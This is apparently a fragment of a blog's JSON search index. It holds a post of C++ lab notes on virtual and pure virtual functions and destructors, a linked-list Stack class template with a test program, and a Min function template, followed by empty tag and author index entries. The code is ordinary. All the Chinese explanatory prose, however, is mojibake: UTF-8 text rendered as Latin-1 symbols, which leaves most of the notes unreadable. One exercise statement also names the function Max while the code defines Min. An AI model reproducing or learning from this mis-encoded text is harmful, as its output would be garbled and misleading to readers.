ææ„å‡½æ•°å¯ä»¥æ˜¯çº¯è™šå‡½æ•°å—?\næœ€åï¼Œæ€»ç»“ä¸€ä¸‹å…³äºè™šå‡½æ•°çš„ä¸€äº›å¸¸è§é—®é¢˜ï¼š\nè™šå‡½æ•°æ˜¯åŠ¨æ€ç»‘å®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨è™šå‡½æ•°çš„æŒ‡é’ˆå’Œå¼•ç”¨èƒ½å¤Ÿæ­£ç¡®æ‰¾åˆ°å®é™…ç±»çš„å¯¹åº”å‡½æ•°ï¼Œè€Œä¸æ˜¯æ‰§è¡Œå®šä¹‰ç±»çš„å‡½æ•°ã€‚è¿™æ˜¯è™šå‡½æ•°çš„åŸºæœ¬åŠŸèƒ½ï¼Œå°±ä¸å†è§£é‡Šäº†ã€‚ æ„é€ å‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•°ã€‚è€Œä¸”ï¼Œåœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨è™šå‡½æ•°ï¼Œå®é™…æ‰§è¡Œçš„æ˜¯çˆ¶ç±»çš„å¯¹åº”å‡½æ•°ï¼Œå› ä¸ºè‡ªå·±è¿˜æ²¡æœ‰æ„é€ å¥½, å¤šæ€æ˜¯è¢«disableçš„ã€‚ ææ„å‡½æ•°å¯ä»¥æ˜¯è™šå‡½æ•°ï¼Œè€Œä¸”ï¼Œåœ¨ä¸€ä¸ªå¤æ‚ç±»ç»“æ„ä¸­ï¼Œè¿™å¾€å¾€æ˜¯å¿…é¡»çš„ã€‚ å°†ä¸€ä¸ªå‡½æ•°å®šä¹‰ä¸ºçº¯è™šå‡½æ•°ï¼Œå®é™…ä¸Šæ˜¯å°†è¿™ä¸ªç±»å®šä¹‰ä¸ºæŠ½è±¡ç±»ï¼Œä¸èƒ½å®ä¾‹åŒ–å¯¹è±¡ã€‚ çº¯è™šå‡½æ•°é€šå¸¸æ²¡æœ‰å®šä¹‰ä½“ï¼Œä½†ä¹Ÿå®Œå…¨å¯ä»¥æ‹¥æœ‰, ç”šè‡³å¯ä»¥æ˜¾ç¤ºè°ƒç”¨ã€‚ ææ„å‡½æ•°å¯ä»¥æ˜¯çº¯è™šçš„ï¼Œä½†çº¯è™šææ„å‡½æ•°å¿…é¡»æœ‰å®šä¹‰ä½“ï¼Œ*å› ä¸ºææ„å‡½æ•°çš„è°ƒç”¨æ˜¯åœ¨å­ç±»ä¸­éšå«çš„*ã€‚ éçº¯çš„è™šå‡½æ•°å¿…é¡»æœ‰å®šä¹‰ä½“ï¼Œä¸ç„¶æ˜¯ä¸€ä¸ªé”™è¯¯ã€‚ æ´¾ç”Ÿç±»çš„overrideè™šå‡½æ•°å®šä¹‰å¿…é¡»å’Œçˆ¶ç±»å®Œå…¨ä¸€è‡´(c++11ä¸­ä½¿ç”¨overrideè¿›è¡Œç¼–è¯‘å™¨æ£€æŸ¥)ã€‚é™¤äº†ä¸€ä¸ªç‰¹ä¾‹ï¼Œå¦‚æœçˆ¶ç±»ä¸­è¿”å›å€¼æ˜¯ä¸€ä¸ªæŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œå­ç±»overrideæ—¶å¯ä»¥è¿”å›è¿™ä¸ªæŒ‡é’ˆï¼ˆæˆ–å¼•ç”¨ï¼‰çš„æ´¾ç”Ÿã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œåœ¨Baseä¸­å®šä¹‰äº†virtual Base* clone(); åœ¨Derivedä¸­å¯ä»¥å®šä¹‰ä¸º virtual Derived* clone()ã€‚å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§æ”¾æ¾å¯¹äºCloneæ¨¡å¼æ˜¯éå¸¸æœ‰ç”¨çš„(ä¹Ÿå°±æ˜¯è¯´overrideå¹¶ä¸ä¼šæ£€æŸ¥è¿”å›å€¼ç±»å‹)ã€‚ 1.10 æ¨¡æ¿ # 1.10.1 ç±»æ¨¡æ¿ # /*æ ˆ Stack æ˜¯ä¸€ç§å…ˆå…¥åå‡ºçš„æ•°æ®ç»“æ„ï¼Œæœ€å…ˆå…¥æ ˆçš„å…ƒç´ ç§°ä¸ºæ ˆåº•ï¼Œæœ€åå…¥æ ˆçš„å…ƒç´ ç§°ä¸ºæ ˆé¡¶ã€‚ä¸ºäº†æ–¹ä¾¿ï¼Œå¯ç”¨ node.hpp ä¸­çš„é“¾è¡¨ç»“æ„å®ç°æ ˆï¼Œå¹¶ç”¨é“¾è¡¨å¤´æŒ‡å‘æ ˆé¡¶å…ƒç´ ã€‚ è¯·å®ç°ä¸€ä¸ªç±»æ¨¡æ¿ Stack ï¼Œä½¿å…¶å¯ä»¥ä¿å­˜ä¸åŒç±»å‹çš„æ•°æ®ã€‚*/ #include \u0026#34;genericStack.hpp\u0026#34; #include \u0026lt;iostream\u0026gt; using namespace std; int main() //ç¨‹åºEX6_4.cpp { Stack\u0026lt;int\u0026gt; stack; // å®ä¾‹åŒ–ä¸€ä¸ªä¿å­˜intå‹å…ƒç´ çš„æ ˆ for (int i = 1; i \u0026lt; 9; i++) // å‘æ ˆä¸­å‹å…¥8ä¸ªå…ƒç´  stack.push(i); while (!stack.isEmpty()) { // æ ˆä¸ä¸ºç©ºæ—¶å¾ªç¯ cout \u0026lt;\u0026lt; stack.getTop() \u0026lt;\u0026lt; \u0026#34; \u0026#34;; // æ˜¾ç¤ºæ ˆé¡¶å…ƒç´  stack.pop(); // å¼¹å‡ºæ ˆé¡¶å…ƒç´  } return 0; } //genericStack.h template \u0026lt;typename ElementType\u0026gt; class Stack{ public: Stack() { top = nullptr; } ~Stack() { while(top){ Node *temp = top; top = top-\u0026gt;next; delete temp; } } void push(ElementType obj) { Node *newNode = new Node{obj, top}; top = newNode; } //å°†æ–°å…ƒç´ å…¥æ ˆ void pop() { if(!isEmpty()){ Node *temp = top; top = top-\u0026gt;next; delete temp; } } //å°†æ ˆé¡¶å…ƒç´ å‡ºæ ˆ ElementType getTop() const { return top-\u0026gt;element; } //è¿”å›æ ˆé¡¶å…ƒç´  bool isEmpty() const { return top==nullptr; } //åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º private: struct Node{ // æ ˆç»“ç‚¹ç±»å‹ ElementType element; // ç»“ç‚¹ä¸­å­˜æ”¾çš„å…ƒç´  Node *next;\t// æŒ‡å‘ä¸‹ä¸€ç»“ç‚¹çš„æŒ‡é’ˆ }; Node *top; // æ ˆé¡¶ }; 1.10.2 å‡½æ•°æ¨¡æ¿ # /*ç¼–å†™ä¸€ä¸ªæ±‚æ•°ç»„ä¸­çš„æœ€å°å…ƒç´ çš„å‡½æ•°æ¨¡æ¿ T Max(T *a, int n)ï¼Œå…¶ä¸­ï¼Œaä¸ºæ•°ç»„ï¼ŒT ä¸ºæ•°ç»„ç±»å‹ï¼Œnä¸ºæ•°ç»„çš„é•¿åº¦ã€‚ æ•°ç»„çš„ç±»å‹å¯ä»¥æ˜¯intå‹ã€doubleå‹å’Œstringç±»å‹ã€‚æ•°ç»„ä¸­å…ƒç´ ä¸ªæ•°3â‰¤nâ‰¤20ã€‚*/ #include\u0026lt;iostream\u0026gt; #include\u0026lt;string\u0026gt; using namespace std; template \u0026lt;typename T\u0026gt; T Min(T *a, int n) { T min = a[0]; for(int i=0;i\u0026lt;n;i++) { if(min \u0026gt; a[i]) min = a[i]; } return min; } 1.10.3 stl çš„åŸºç¡€ä½¿ç”¨ # ç•¥\n","date":"June 30, 2023","permalink":"/posts/c++/homework/c++%E5%AE%9E%E9%AA%8C%E9%A2%98/","section":"Posts","summary":"1.åŸºç¡€çŸ¥è¯†(ğŸ¶éƒ½ä¸çœ‹å¥½å§) # å¿™é‡Œå·é—²æ•´ç†ä¸€ä¸‹ä¸Šå­¦æœŸ","title":"C++å®éªŒ"},{"content":"","date":"June 30, 2023","permalink":"/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"Tags","summary":"","title":"åŸºç¡€çŸ¥è¯†"},{"content":"","date":"January 1, 1","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"}]